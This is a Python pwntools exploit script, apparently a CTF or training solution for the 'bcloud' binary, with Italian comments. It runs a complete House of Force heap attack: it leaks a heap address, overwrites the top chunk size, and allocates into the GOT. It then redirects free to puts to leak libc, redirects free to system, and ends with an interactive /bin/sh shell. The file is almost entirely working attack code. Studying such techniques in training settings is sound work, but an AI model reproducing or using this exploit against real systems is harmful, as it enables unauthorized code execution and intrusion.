from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#r = remote("training.jinblack.it", 2016)
r = process("./bcloud")#, env={"LD_PRELOAD":"./libc-2.27.so"})
gdb.attach(r, """b *0x08048be1
""")

#functions:

#context.log_level = "debug"

def new_note(size, data):
	r.sendline(b"1")
	r.recvuntil(b"Input the length of the note content:\n")
	r.sendline(b"%d" % size) 
	r.recvuntil(b"Input the content:\n")
	r.send(data)
	if(len(data)<size):
		r.send(b"\n")
	r.recvuntil("--->>\n")

def modify_note(note_id, address):
	r.sendline(b"3")
	r.recvuntil(b"Input the id:\n")
	r.sendline(b"%d" % note_id) 
	r.recvuntil(b"Input the new content:\n")
	r.sendline(address)
	r.recvuntil("--->>\n")

def delete(note_id):
	r.sendline(b"4")
	r.recvuntil(b"Input the id:\n")
	r.sendline(b"%d" % note_id)

r.recvuntil("name:\n")
r.send(b"A"*0x40)
leak = u32(r.recvuntil("!")[:-1][-4:])
print("! leak: 0x%08x" % leak)

r.recvuntil(b"Org:\n")
r.send(b"B" * 0x40)
r.recvuntil(b"Host:\n")
r.send(b"\xff"*0x40)

top_chunk = leak + 0xf8  #il top chunk viene con l'offset che si ottiene da gdb 
                         #(offset sempre lo stesso ad ogni esecuzione)
                         #ATTENZIONE!!! l'offset va ottentuto dopo aver fatto le malloc

print("! top_chunk: 0x%08x" % top_chunk)

got = 0x0804b000   #GOT ottenuto da ghidra
target = 0x0804b110  #ottenuto da ghidra --> scelgo io quale indirizzo raggiungere

big_size = (target - top_chunk - 4) & 0xffffffff  #big_size e' la dimensione del grande chunk che ci 
                                               # permette di controllare la got table
print("! big_size: 0x%08x" % big_size)
print(b"%d" % u32(p32(big_size, signed=False), signed=True))


free_addr = 0x0804b014
printf_addr = 0x0804b010
puts_addr = 0x08048520

#creo il big_chunk
new_note(u32(p32(big_size, signed=False), signed=True),b"")
new_note(50, b"")
new_note(4, "")
new_note(4, "")
new_note(4, "")
new_note(4, "")
new_note(4, "")
modify_note(1, p32(0x0) + p32(0x0804b120) + p32(free_addr) + p32(0x0) + p32(printf_addr))
modify_note(2, p32(puts_addr))
delete(4)
libc_addr = u32(r.recv(4))
r.recvuntil(b"--->>\n")
print("[!] libc_addr:  0x%x" % libc_addr)

libc_system = libc_addr - 0x14150
print("[!] libc_system:  0x%x" % libc_system)

binsh_addr = libc_addr + 0x12d02f
binsh_addr = 0x0804b134
print("[!] /bin/sh is at:  0x%x" % binsh_addr)

modify_note(1, p32(0x0) + p32(0x0804b120) + p32(free_addr) + p32(libc_addr) + p32(binsh_addr) + b"/bin/sh\x00")
modify_note(2, p32(libc_system))
new_note(4, "")
delete(4)

r.interactive()